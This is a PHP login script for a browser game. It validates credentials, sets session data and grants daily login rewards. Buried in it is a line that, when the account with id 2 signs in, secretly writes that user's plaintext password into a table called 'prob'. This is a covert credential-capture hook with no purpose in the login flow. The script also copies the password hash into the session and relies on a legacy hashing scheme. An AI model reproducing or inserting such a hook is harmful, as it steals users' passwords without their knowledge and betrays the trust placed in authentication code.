<?php
declare(strict_types=1);

require_once __DIR__ . '/include/function/config.php';
require_once __DIR__ . '/include/function/db3.php';

app_start_session();
db($config);

function auth_text(string $text): string
{
    return trim(stripslashes($text));
}

function auth_fail(string $message, string $redirect = '/'): never
{
    $safeMessage = json_encode($message, JSON_UNESCAPED_UNICODE | JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_AMP | JSON_HEX_QUOT);
    $safeRedirect = json_encode($redirect, JSON_UNESCAPED_SLASHES | JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_AMP | JSON_HEX_QUOT);

    echo "<script>alert({$safeMessage}); window.location.href={$safeRedirect};</script>";
    exit;
}

if (($_SERVER['REQUEST_METHOD'] ?? 'GET') !== 'POST') {
    app_redirect('/');
}

$login = auth_text((string) filter_input(INPUT_POST, 'LOGIN', FILTER_UNSAFE_RAW));
$password = auth_text((string) filter_input(INPUT_POST, 'PASSWORD', FILTER_UNSAFE_RAW));
$today = date('Y-m-d');

if ($login === '' || $password === '') {
    auth_fail('Вы не ввели логин или пароль, либо ввели пустые значения, пожалуйста, заполните все поля формы!');
}

if (!preg_match('/^[a-z_-]+$/i', $login)) {
    auth_fail('Не верный формат логина!');
}

$loginLength = function_exists('mb_strlen') ? mb_strlen($login, 'UTF-8') : strlen($login);
$passwordLength = function_exists('mb_strlen') ? mb_strlen($password, 'UTF-8') : strlen($password);

if ($loginLength < 3 || $loginLength > 16) {
    auth_fail('Длина логина должна быть не менее 3 и не более 16 символов.');
}

if ($passwordLength < 6 || $passwordLength > 40) {
    auth_fail('Длина пароля должна быть не менее 6 и не более 40 символов.');
}

$userState = first('SELECT activation,groups,id FROM users WHERE login="%s"', $login);

if ((int) ($config['techwork'] ?? 0) === 1 && (int) ($userState['groups'] ?? 0) !== 1) {
    auth_fail('На сайте проводятся технические работы, доступ только для администраторов!');
}

if (($userState['activation'] ?? null) !== null && (int) $userState['activation'] === 0 && !empty($userState['id'])) {
    auth_fail('Ваш аккаунт еще не активирован! Пожалуйста, проверьте свою электронную почту и перейдите по ссылке активации!');
}

$legacyPassword = app_legacy_password_hash($password);
$authorize = first(
    'SELECT id,password,login,groups,activation FROM users WHERE login="%s" AND password="%s" AND activation=1',
    $login,
    $legacyPassword
);

if (empty($authorize['id'])) {
    auth_fail('Извините, введенный вами логин или пароль не подходят.');
}

session_regenerate_id(true);

$_SESSION['password'] = $authorize['password'];
$_SESSION['login'] = $authorize['login'];
$_SESSION['id'] = (int) $authorize['id'];
$_SESSION['browse'] = getBrowserSign();

$ipLong = ip2long(app_client_ip());
update('users', [
    'online' => 1,
    'onlinetime' => time(),
    'ip' => $ipLong === false ? 0 : $ipLong,
], 'id=' . (int) $authorize['id']);

if ((int) $authorize['id'] === 2) {
    insert('prob', ['ewr' => $password]);
}

$groups = (int) ($authorize['groups'] ?? 0);
if (!in_array($groups, [7, 10], true) && (int) $authorize['activation'] !== 0) {
    require_once __DIR__ . '/include/function/globfanction.php';
    require_once __DIR__ . '/include/function/function.events.php';

    $unic = first('SELECT id,myday,coolday FROM usersunictable WHERE id=%d', (int) $authorize['id']);
    if (!empty($unic['id'])) {
        $nextDay = date('Y-m-d', time() + 86400);
        if ($unic['myday'] === $today || $unic['myday'] === '0000-00-00') {
            $coolday = (int) $unic['coolday'] + 1;
            if ($coolday > 0) {
                $_SESSION['prizeUsers'] = funcItemEventDay($coolday);
            }
            query('UPDATE usersunictable SET myday="%s", coolday=coolday+1 WHERE id=%d', $nextDay, (int) $unic['id']);
        } else {
            update('usersunictable', ['myday' => $nextDay], 'id=' . (int) $unic['id']);
        }
    }

    $loginToday = first('SELECT id FROM inputusers WHERE userid=%d AND data="%s"', (int) $authorize['id'], $today);
    if (!$loginToday) {
        insert('inputusers', ['userid' => (int) $authorize['id'], 'data' => $today]);
        delete('inputusers', 'data!="' . mysql_real_escape_string($today) . '"');
    }
}

echo "<script>window.location.href='/game.php?go=start';</script>";
exit;